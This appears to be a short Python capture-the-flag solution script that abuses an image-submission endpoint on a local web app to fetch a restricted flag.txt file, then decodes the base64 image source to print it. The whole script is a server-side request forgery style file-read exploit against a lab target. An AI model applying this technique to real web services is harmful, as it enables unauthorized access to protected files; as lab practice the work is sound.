from bs4 import BeautifulSoup
import base64
import requests as r
import time
import random
import os
import hashlib

url = "http://127.0.0.1:3000"

r1 = r.post(f"{url}/submitimage",data={
    "url":"http://127.0.0.1:3000/restricted_memes/flag.txt",
})

cookie = r1.history[0].headers['Set-Cookie']

r1 = r.post(f"{url}/captionsubmit", data={
    "caption": ''
}, headers = {"Cookie" : cookie})

soup = BeautifulSoup(r1.content, 'html.parser')

img = soup.find_all("img")

print(base64.b64decode(img[0]['src']))
